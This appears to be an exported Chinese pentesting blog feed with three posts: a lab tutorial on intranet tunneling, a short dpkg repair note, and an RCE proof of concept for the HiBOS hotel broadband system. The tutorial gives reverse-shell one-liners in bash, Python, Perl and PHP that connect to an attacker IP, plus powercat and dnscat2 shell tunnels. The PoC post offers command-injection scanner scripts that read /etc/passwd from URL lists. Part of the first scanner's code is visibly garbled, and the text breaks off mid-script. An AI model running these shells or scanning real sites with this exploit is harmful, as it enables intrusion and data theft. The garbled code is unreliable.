<h5 id="PingTunnel使用"><a href="#PingTunnel使用" class="headerlink" title="PingTunnel使用"></a>PingTunnel使用</h5><p>【待补充】</p>
<hr>
<h4 id="传输层隧道"><a href="#传输层隧道" class="headerlink" title="传输层隧道"></a>传输层隧道</h4><h5 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="lcx端口转发"></a>lcx端口转发</h5><p>【待补充】</p>
<h5 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h5><p>下载地址（解压密码为nc）:</p>
<p><a href="https://joncraton.org/files/nc111nt.zip">https://joncraton.org/files/nc111nt.zip</a></p>
<p><a href="https://joncraton.org/files/nc111nt_safe.zip">https://joncraton.org/files/nc111nt_safe.zip</a></p>
<br>

<h6 id="获取banner信息"><a href="#获取banner信息" class="headerlink" title="获取banner信息"></a>获取banner信息</h6><p><code>nc -nv 192.168.0.130 22</code></p>
<p><img src="/posts/11ff0b53/nc_nv.png"></p>
<h6 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h6><p><code>nc -zv 192.168.56.101 1080</code></p>
<p><img src="/posts/11ff0b53/nc_portscan.png">              </p>
<h6 id="远程连接主机"><a href="#远程连接主机" class="headerlink" title="远程连接主机"></a>远程连接主机</h6><p><code>nc -nvv 192.168.0.129 80</code>                                                     </p>
<h6 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h6><p><code>nc -lp 9999</code> 监听本地9999端口，访问该端口是会输出信息</p>
<h6 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h6><p>Ubuntu: <code>nc -lp 6666 &gt; test.txt</code> 开启监听</p>
<p>kali：<code>echo &#39;test&#39; &gt; test.txt</code></p>
<p><code>nc -vn 192.168.0.130 6666 &lt; test.txt -q 1</code></p>
<p><img src="/posts/11ff0b53/nc_file.png"></p>
<h6 id="简易聊天"><a href="#简易聊天" class="headerlink" title="简易聊天"></a>简易聊天</h6><p>Ubuntu: <code>nc -l -p 8888</code></p>
<p>kali：<code>nc -vn 192.168.0.130 8888</code></p>
<p><img src="/posts/11ff0b53/nc_talk.png"></p>
<h5 id="nc获取shell"><a href="#nc获取shell" class="headerlink" title="nc获取shell"></a>nc获取shell</h5><p>参考 <a href="https://www.freebuf.com/sectool/243115.html">https://www.freebuf.com/sectool/243115.html</a></p>
<p><a href="https://www.jianshu.com/p/91dd4ab317c7">https://www.jianshu.com/p/91dd4ab317c7</a></p>
<br>

<blockquote>
<p>正向shell   目标机进行监听<br>反向shell   攻击机进行监听</p>
</blockquote>
<h6 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h6><p>客户端连接服务器，客户端获取服务端的shell （kali【攻击机】连接，目标机监听）</p>
<p>目标机： <code>nc -lvp 8888 -e /bin/sh</code></p>
<p>攻击机：<code>nc 192.168.0.128 8888</code></p>
<br>

<p><img src="/posts/11ff0b53/nc_ubuntu_error.png"></p>
<p>这里我使用Ubuntu作为目标机器是 使用-e 参数会报错，使用版本不同，这里ubuntu默认版本的nc为netcat-openbsd ，没有-e参数 而netcat-traditional版本[v1.10-41.1] 的存在-e选项，kali也是默认该版本的nc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#给Ubuntu替换一个nc版本 参考https://www.jianshu.com/p/91dd4ab317c7</span><br><span class="line">sudo apt-get -y install netcat-traditional </span><br><span class="line"></span><br><span class="line">sudo update-alternatives --config nc </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/11ff0b53/ubuntu_nc_tra.png"></p>
<p>成功切换ubuntu的nc版本</p>
<br>

<p>依旧使用kali作为攻击机，ubuntu作为目标机</p>
<p>ubuntu: <code>nc -lvp 8888 -e /bin/sh</code></p>
<p>kali: <code>nc  192.168.0.130 8888</code></p>
<p><img src="/posts/11ff0b53/nc_shell1.png"></p>
<h6 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h6><p>客户端连接服务器，服务器获取客户端的shell（kali【攻击机】监听，目标机连接）</p>
<p>攻击机：<code>nc -lvp 8888</code></p>
<p>目标机 ：<code>nc 192.168.0.130 8888 -e /bin/sh</code></p>
<p>如果是windows <code>nc -lvp lport -e c:\windows\system32\cmd.exe </code></p>
<p><img src="/posts/11ff0b53/nc_shell2.png"></p>
<h6 id="python反向shell"><a href="#python反向shell" class="headerlink" title="python反向shell"></a>python反向shell</h6><p>注意：这里使用的python2进行反弹shell</p>
<p>攻击机：<code>nc -lvp 8888</code></p>
<p>目标机：<code>python2 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.128&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></p>
<p><img src="/posts/11ff0b53/nc_shell3.png"></p>
<h6 id="bash反向shell"><a href="#bash反向shell" class="headerlink" title="bash反向shell"></a>bash反向shell</h6><p>攻击机：<code>nc -lvp 8888 </code></p>
<p>目标机：<code>bash -i &gt;&amp; /dev/tcp/192.168.0.128/8888 0&gt;&amp;1</code></p>
<p><img src="/posts/11ff0b53/nc_shell4.png"></p>
<h6 id="php反向shell"><a href="#php反向shell" class="headerlink" title="php反向shell"></a>php反向shell</h6><p>攻击机：<code>nc -lvp 8888</code></p>
<p>目标机：<code>php -r &#39;$sock=fsockopen(&quot;192.168.0.128&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>
<p>由于ubuntu没装php环境就不截图演示了</p>
<h6 id="perl反向shell"><a href="#perl反向shell" class="headerlink" title="perl反向shell"></a>perl反向shell</h6><p>攻击机：<code>nc -lvp 8888</code></p>
<p>目标机：<code>perl -e &#39;use Socket;$i=&quot;192.168.0.128&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></p>
<h6 id="内网代理弹shell"><a href="#内网代理弹shell" class="headerlink" title="内网代理弹shell"></a>内网代理弹shell</h6><p><img src="/posts/11ff0b53/neiwangdaili_shell.jpg"></p>
<p>kali执行:<code>nc -lvp 3333</code><br>数据库执行:<code>nc -lvp 3333 -e /bin/sh</code><br>web服务器执行：<code>nc -v 192.168.1.4 3333 -c &quot;nc -v 1.1.1.200 3333&quot;</code></p>
<p>原理：web服务器当作中间机，连接kali和数据库的3333端口，使kali与数据库通信</p>
<h6 id="exec反弹shell"><a href="#exec反弹shell" class="headerlink" title="exec反弹shell"></a>exec反弹shell</h6><p>攻击机：<code>nc -lvp 8888</code></p>
<p>目标机：<code>0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/192.168.0.128/8888; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></p>
<p><img src="/posts/11ff0b53/nc_shell5.png"></p>
<p>可以利用python2 变为交互式的shell <code>python2 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
<p>或<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
<hr>
<h5 id="powercat使用"><a href="#powercat使用" class="headerlink" title="powercat使用"></a>powercat使用</h5><p>powercat可以理解成powershell版的natcat,</p>
<p>下载地址： <a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p>
<p>下载下来的powercat.ps1文件 进行导入<code> Import-Module .\powercat.ps1</code></p>
<p>如果权限不足 以管理员身份打开powershell<code>Set-ExecutionPolicy Unrestricted</code>输入Y</p>
<p><code>Get-ExecutionPolicy</code>查看当前ps权限</p>
<p> <code>powercat -h</code>测试是否导入成功</p>
<p><img src="/posts/11ff0b53/powercat1.png"></p>
<p>在win10中更改poweshell权限 <code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe </code>以管理员权限运行，在本机进行尝试时，每次导入模块后系统都会将powercat.ps1删除掉…</p>
<blockquote>
<p>#powercat  命令参数</p>
<p>-l 监听模式</p>
<p>-p 指定监听端口</p>
<p>-e 指定启动进程的名称</p>
<p>-v 显示详情</p>
<p>-c 指定想要连接的 IP 地址</p>
<p>-ep 返回 powershell -dns 使用 dns 通信</p>
<p>-g 生成 payload -ge 生成经过编码的 payload，可以直接使用 powershell </p>
<p>-e 执行该 payload</p>
</blockquote>
<h6 id="通过nc正向连接powercat"><a href="#通过nc正向连接powercat" class="headerlink" title="通过nc正向连接powercat"></a>通过nc正向连接powercat</h6><p>win7：<code>powercat -l -p 8888 -e cmd.exe -v</code></p>
<p>kali：<code>nc 192.168.0.129 8888</code></p>
<p><img src="/posts/11ff0b53/powercat_shell1.png"></p>
<h6 id="通过nc反向连接powercat"><a href="#通过nc反向连接powercat" class="headerlink" title="通过nc反向连接powercat"></a>通过nc反向连接powercat</h6><p>kali：<code>nc -l -p 8888 -v </code></p>
<p>win7：<code>powercat -c 192.168.0.128 -p 8888 -v -e cmd.exe</code></p>
<h6 id="返回powershell"><a href="#返回powershell" class="headerlink" title="返回powershell"></a>返回powershell</h6><p>win7：<code>powercat -l -v -p 8888</code></p>
<p>win2008：<code>powercat -c 192.168.0.129 -p 8888 -v -ep</code></p>
<p><img src="/posts/11ff0b53/powercat_shell3.png"></p>
<h6 id="powercat-生成paylaod"><a href="#powercat-生成paylaod" class="headerlink" title="powercat 生成paylaod"></a>powercat 生成paylaod</h6><p>win7： <code>Powercat -l -p 8888 -e cmd -v -g &gt;&gt;shell.ps1</code> 将shell.ps1传到win2008并执行</p>
<p>win7：<code>powercat -c 192.168.0.132 -p 8888 -v</code></p>
<p>这里试了好几次都没成功…….</p>
<p>不想生成文件的话们可以使用 -ge 生成编码后的payload</p>
<p>win7：<code>powercat -c 192.168.0.129 -p 8888 -ep -ge</code></p>
<h6 id="创建dns隧道连接"><a href="#创建dns隧道连接" class="headerlink" title="创建dns隧道连接"></a>创建dns隧道连接</h6><p>在kali上安装discat</p>
<blockquote>
<p>git clone <a href="https://github.com/iagox86/dnscat2.git">https://github.com/iagox86/dnscat2.git</a><br>cd dnscat2/server/<br>gem install bundler<br>bundle install</p>
</blockquote>
<p>同时安装ruby环境</p>
<p>开启服务端 <code>ruby dnscat2.rb powercat -e open --no-cache</code></p>
<p>在win7目标机执行以下命令 建立dns隧道</p>
<p><code>powercat -c 192.168.0.128 -p 53 -dns powercat -e cmd.exe</code> 这里ip为kali ip</p>
<p><img src="/posts/11ff0b53/powercat_win7.PNG"></p>
<p>在win7执行完命令后会获得一个session</p>
<p><img src="/posts/11ff0b53/powercat_dns_shell.PNG"></p>
<p><code>session -i 1</code></p>
<p><img src="/posts/11ff0b53/powercat_dns_shell2.PNG"></p>
<p>但是使用该隧道在执行命令时会有些卡，不建议使用</p>
<h6 id="powercat作为跳板进行转发"><a href="#powercat作为跳板进行转发" class="headerlink" title="powercat作为跳板进行转发"></a>powercat作为跳板进行转发</h6><p>kali：192.168.0.128</p>
<p>win7：192.168.0.129</p>
<p>win2008：192.168.0.132</p>
<p>win7做跳板，让kali通过win7连接win2008</p>
<p>win2008  <code>powercat -l -v -p 4444 -e cmd.exe</code></p>
<p>win7 <code>powercat -l -v -p 5555 -r tcp:192.168.0.132:4444</code></p>
<p>kali <code>nc  192.168.0.129 5555 -vv</code></p>
<hr>
<h3 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h3><h4 id="SSH功能："><a href="#SSH功能：" class="headerlink" title="SSH功能："></a>SSH功能：</h4><p> 1.<strong>加密</strong>SSH Client 端值 SSH Server 端之间的通讯数据</p>
<p>2.<strong>突破防护墙的限制</strong>完成一些无法建立的TCP连接</p>
<h4 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h4><p><code>ssh root@192.168.0.129 -P 22</code></p>
<p>本质为端口转发</p>
<blockquote>
<p>环境配置<br>win7    192.168.0.129(NAT)  10.10.0.130(仅主机)<br>kali        192.168.0.128(NAT)<br>ubuntu 192.168.0.130(NAT)<br>win2008  10.10.0.131(仅主机)</p>
</blockquote>
<h4 id="密码登录于中间人攻击"><a href="#密码登录于中间人攻击" class="headerlink" title="密码登录于中间人攻击"></a>密码登录于中间人攻击</h4><p>1..远程主机收到用户登录请求，吧自己的公钥发给用户</p>
<p>2.用户使用该公钥，将密码加密后，发给远程主机</p>
<p>3.远程主机用自己的私钥，解密登录密码，如果密码正确，用户就能登录</p>
<blockquote>
<p>服务器  ==========&gt; 用户 =====================&gt; 服务器  </p>
<p>————发送公钥———–利用公钥加密私钥并发送—-密码验证（Y/N）</p>
</blockquote>
<br>

<p>SSH隧道原理</p>
<ul>
<li>本地端口转发</li>
</ul>
<blockquote>
<p>client/kali ————— 跳转机 ubnutu —————-server/win2008</p>
<p>192.168.0.128———–jump/192.168.0.129————10.10.0.135</p>
<p>——————————–10.10.0.137———————</p>
</blockquote>
<p><code>ssh -L 本地端口:目标主机:目标端口  jump主机host</code></p>
<p><code>ssh -L 2121:10.10.0.2:21 root@192.168.0.129</code></p>
<blockquote>
<p>建立SSH隧道常用参数<br>-C 压缩传输，提高传输速度。<br> -f 将 SSH 传输转入后台执行，不占用当前 shell<br>-N 建立静默连接（建立了连接但看不到具体会话）<br> -g 允许远程主机连接本地用于转发的端口。<br> -L 本地端口转发<br> -R 远程端口转发<br> -D 动态转发（ SOCKS 代理）<br> -p 指定 SSH 端口</p>
</blockquote>
<ul>
<li>远程端口转发</li>
</ul>
<blockquote>
<p>client/ kali—————–jump/ubuntu——————-server/win2008</p>
<p>192.168.0.128————–10.10.0.129    ———————10.10.0.135</p>
<p>——————————没有外网ip————————————</p>
<p>—————————-但是可以连接外网——————————</p>
</blockquote>
<p>跳转机为纯内网环境，但是可以访问外网</p>
<p>也就是说，跳转机可以访问kali，kali无法访问跳转机，在跳转机上建立一个与kali的连接，然后再kali上使用这个连接  然后将所有数据通过跳转机转发给目标主机的目标端口  (在这里远程主机为kali)</p>
<p><code>ssh -R 远程主机端口:目标主机：目标主机端口 跳转机</code></p>
<p><code>ssh -R 2121:10.10.0.135:21  10.10.0.129</code></p>
<blockquote>
<p>建立SSH隧道常用参数<br>-C 压缩传输，提高传输速度。<br> -f 将 SSH 传输转入后台执行，不占用当前 shell<br>-N 建立静默连接（建立了连接但看不到具体会话）<br> -g 允许远程主机连接本地用于转发的端口。<br> -L 本地端口转发<br> -R 远程端口转发<br> -D 动态转发（ SOCKS 代理）<br> -p 指定 SSH 端口</p>
</blockquote>
<ul>
<li>动态转发</li>
</ul>
<p>建立一个 socks 连接，任何支持 socks 4/5 协议的程序都可以使用这个加密通道进行访问</p>
<p>可以参考梯 子 </p>
<p><code>ssh -D 8080 user@host</code></p>
<blockquote>
<p>外网去访问内网中的二级服务器</p>
<p>外网  —————  一级服务器 ——–防火墙  ——– 二级服务器<br>——–外网    |  内网  ——— 二级服务器只能通过一级服务器访问</p>
<p>在一级服务器上通过本地端口转发，把二级服务器上的流量导到一级服务器上。这样就可以通过一级服务器去访问二级服务器。 所以 二级服务器中的服务器可以通过远程端口转发的方法直接映射到外网的主机，将二级内网的流量直接导入到外网主机的端口，从而实现从外网去访问二级主机</p>
</blockquote>
<br>

<h4 id="SSH隧道利用"><a href="#SSH隧道利用" class="headerlink" title="SSH隧道利用"></a>SSH隧道利用</h4><h5 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h5><h6 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h6><blockquote>
<p>kali 192.168.0.128（NAT）<br>winserver2008  10.10.0.139（VM18 仅主机）<br>Ubuntu 192.168.0.130（NAT）10.10.0.137（VM18 仅主机）</p>
</blockquote>
<br>

<blockquote>
<p>开启 winServer2008 远程连接 <a href="https://www.cnblogs.com/Tanghongchang/p/7445786.html">https://www.cnblogs.com/Tanghongchang/p/7445786.html</a></p>
</blockquote>
<p>kali执行以下命令，将内网主机的3389端口映射到自己的3389端口</p>
<p><code>ssh -CfNg -L 攻击主机端口:内网办公主机IP:内网办公主机端口 Web服务器ssh用户名@Web服务器IP</code></p>
<p><code>ssh -CfNg -L 3333:10.10.0.139:3389 mamor@192.168.0.130 </code></p>
<p>通过服务器 192.168.0.139作为跳板 将内网主机winServer2008 的3389端口转发到kali的3388端口，然后访问kali的3333端口即可访问到WinServer2008的3389端口了</p>
<p>使用netstat 进行判断是否建立代理转发</p>
<p><code>netstat -pantu | grep &quot;3333&quot;</code></p>
<p><img src="/posts/11ff0b53/ssh_bendi1.png"></p>
<p>（连接被重设：我先在winServer2008中打开了远程服务 然后用Vm18网段的机器测试完 之后发现winServer2008的ip变了，然后一直在找原因 为什么连不同了…然后改下ssh命令的winserver ip就好了） </p>
<p>然后输入账号密码 即可登录到10.10.0.139 winServer2008服务器中</p>
<p><img src="/posts/11ff0b53/ssh_bendi2.png"></p>
<h5 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h5><p>环境</p>
<blockquote>
<p>kali 192.168.0.128(NAT模式)</p>
<p>Ubuntu 10.10.0.137(VM18 仅主机)</p>
<p>winServer2008 10.10.0.139 (VM18仅主机)0</p>
</blockquote>
<blockquote>
<p>删除Ubuntu的nat 网卡，现在仅有VM18一块网卡(10.10.0.0/24网段的)</p>
<p>但是在设置网络的时候没找到相关的文字，没成功连上外网，之后有时间整个vps复现</p>
</blockquote>
<p><code>ssh -R 远程主机端口:目标主机：目标主机端口 跳转机</code></p>
<p>使用 -R 创建一个远程转发模式的隧道</p>
<p><code>ssh -CfNg -R 3333:10.10.0.139:3389  mamor@192.168.0.130</code></p>
<p>使用<code>netstat</code>判断代理转发是否成功建立</p>
<p><code>netstat  -ano | grep &quot;3333&quot; </code></p>
<p><code>rdesktop 127.0.0.1:3333</code></p>
<br>

<h5 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h5><h6 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h6><blockquote>
<p>kali 192.168.0.128(NAT)</p>
<p>Ubuntu 192.168.0.130(NAT) 10.10.0.137(VM18 仅主机)</p>
<p>WinServer2008 10.10.0.139(VM18 仅主机)</p>
</blockquote>
<br>

<p><code>ssh -CfNg -D 攻击主机端口 Web服务器ssh用户名@Web服务器IP</code></p>
<p> <code>ssh -CfNg -D 8888  mamor@192.168.0.130</code></p>
<p>然后使用proxychains4 代理</p>
<p><code>sudo vim /etc/proxychains4.conf</code></p>
<p>添加<code>socks5 127.0.0.1 8888</code></p>
<p>然后使用<code>proxychains4 firefox 10.10.0.139 </code>成功访问到内网WinServer2008 的web页面</p>
<p><img src="/posts/11ff0b53/ssh_dongtai1.png"></p>
<p><img src="/posts/11ff0b53/ssh_dongtai2.png"></p>
<p>但是 使用firefox的代理插件SwitchyOmega 无法访问内网的web页面</p>
<p>使用proxychains4 访问WinServer2008的3389端口</p>
<p><code>proxychains4 rdesktop 10.10.0.139:3389 </code></p>
<p><img src="/posts/11ff0b53/ssh_dongtai_rdesktop1.png"></p>
<p><img src="/posts/11ff0b53/ssh_dongtai_rdesktop2.png"></p>
<p>成功访问3389端口</p>
<br>

<hr>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://websec.readthedocs.io/zh/latest/intranet/index.html">https://websec.readthedocs.io/zh/latest/intranet/index.html</a></p>
<p><a href="https://c.wgpsec.org/p/10053">https://c.wgpsec.org/p/10053</a></p>
<p><a href="https://www.icode9.com/content-3-780098.html">https://www.icode9.com/content-3-780098.html</a></p>
<p><a href="https://yoga7xm.top/2019/03/27/IPentest-discover/">https://yoga7xm.top/2019/03/27/IPentest-discover/</a></p>
<p><a href="https://www.cnblogs.com/-chenxs/p/12378110.html">https://www.cnblogs.com/-chenxs/p/12378110.html</a></p>
<p><a href="https://soapffz.com/sec/21.html">https://soapffz.com/sec/21.html</a></p>
<p><a href="https://www.freebuf.com/sectool/243115.html">https://www.freebuf.com/sectool/243115.html</a></p>
<p><a href="https://teamssix.com/year/210601-155103.html">https://teamssix.com/year/210601-155103.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>E:dpkg被中断，您必须手工运行sudodpkg</title>
    <url>/posts/14f5ef78/</url>
    <content><![CDATA[<p>解决方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo rm /var/lib/dpkg/updates/*</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>HiBOS酒店宽带运营系统RCE漏洞POC</title>
    <url>/posts/c20f4593/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload </span><br><span class="line">url + /manager/radius/server_ping.php?ip=127.0.0.1|cat /etc/passwd &gt;../../aaa.txt&amp;id=1</span><br><span class="line">访问 url + /aaa.txt</span><br><span class="line"></span><br><span class="line">如果存在 root:x:0:0:root:/root:/bin/bash</span><br><span class="line">说明漏洞存在</span><br></pre></td></tr></table></figure>

<p>v0.1单线程版 后续完善 用法<br><code>python3 poc.py -u url</code><br><code>python3 poc.py -f url.txt</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*  HiBOS酒店宽带运营系统RCE漏洞POCv0.1  *&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*                      Mamor        *&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;     -f ,--file urls.txt             &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">                url.replace(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;https://&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = <span class="string">&quot;https://&quot;</span> + url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]url形式不符合！ %s [*]&quot;</span> % url)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url</span>):</span><br><span class="line">    payload = <span class="string">&#x27;/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd%20&gt;../../aaa.txt&amp;id=1&#x27;</span></span><br><span class="line">    url1 = url + payload</span><br><span class="line">%<span class="number">20</span>&gt;../../aaa.txt&amp;<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    req = requests.get(url=url1, headers=header, verify=False)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    url2 = url + &#x27;</span>/aaa.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    req2 = requests.get(url=url2, headers=header, verify=False)</span></span><br><span class="line"><span class="string">    if &#x27;</span>root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash<span class="string">&#x27; in req2.text:</span></span><br><span class="line"><span class="string">        print(&quot;[*] url:&quot; + url + &quot;--------------存在漏洞[*]&quot;)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        print(&quot;[*] url:&quot; + url + &quot;-------------不存在漏洞[*]&quot;)</span></span><br><span class="line"><span class="string">def main():</span></span><br><span class="line"><span class="string">    parser = OptionParser()</span></span><br><span class="line"><span class="string">    parser.add_option(&quot;-u&quot;, &quot;--url&quot;, dest=&quot;url&quot;, default = &#x27;</span><span class="string">&#x27; , type=str, help=&#x27;</span>输入url<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    parser.add_option(&quot;-f&quot;, &quot;--file&quot;, dest=&quot;file&quot;, default= &#x27;</span><span class="string">&#x27;, help=&#x27;</span>收集的txt<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    (option, args) = parser.parse_args()</span></span><br><span class="line"><span class="string">    # print(parser.parse_args())</span></span><br><span class="line"><span class="string">    url = option.url</span></span><br><span class="line"><span class="string">    file = option.file</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if file != &#x27;</span><span class="string">&#x27;:</span></span><br><span class="line"><span class="string">        print(&quot;[*] Start .......              [*]&quot;)</span></span><br><span class="line"><span class="string">        with open(file,&#x27;</span><span class="string">r&#x27;) as f:</span></span><br><span class="line"><span class="string">            for line in f.readlines():</span></span><br><span class="line"><span class="string">                url = line.strip()</span></span><br><span class="line"><span class="string">                url = parse_url(url)</span></span><br><span class="line"><span class="string">                exp(url)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        print(&quot;[*] End .......                [*]&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if url !=&#x27;</span><span class="string">&#x27;:</span></span><br><span class="line"><span class="string">        exp(url)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &#x27;</span>__main__<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">    banner()</span></span><br><span class="line"><span class="string">    main()</span></span><br></pre></td></tr></table></figure>

<p>使用多线程 把结果存处output.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">thread = []</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*  HiBOS酒店宽带运营系统RCE漏洞POCv0.2  *&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*                      Mamor        *&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;     -u ,--url url                   &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;     -f ,--file urls.txt             &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">                url.replace(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;https://&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = <span class="string">&quot;https://&quot;</span> + url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]url形式不符合！ %s [*]&quot;</span> % url)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url</span>):</span><br><span class="line">    payload = <span class="string">&#x27;/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd%20&gt;../../aaa.txt&amp;id=1&#x27;</span></span><br><span class="line">    url1 = url + payload</span><br><span class="line">    req = requests.get(url=url1, headers=header, verify=<span 